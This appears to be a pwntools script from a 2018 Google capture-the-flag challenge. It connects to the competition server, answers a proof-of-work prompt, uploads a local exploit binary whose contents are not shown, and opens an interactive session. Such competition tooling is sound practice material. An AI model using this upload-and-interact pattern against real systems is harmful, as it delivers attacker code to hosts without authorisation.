#!/usr/bin/env python2
#Copyright 2018 Google LLC
#
#Licensed under the Apache License, Version 2.0 (the "License");
#you may not use this file except in compliance with the License.
#You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
#Unless required by applicable law or agreed to in writing, software
#distributed under the License is distributed on an "AS IS" BASIS,
#WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#See the License for the specific language governing permissions and
#limitations under the License.

from pwn import *

binary = read('./doit')

#r = process('./drive')
r = remote('drive.ctfcompetition.com', 1337)
r.recvuntil('hashcash')
r.sendline('eph1Fiew')
print r.recvuntil(' data\n')
r.send(p32(len(binary)) + binary)
print r.recvuntil(' bytes\n')

r.interactive()
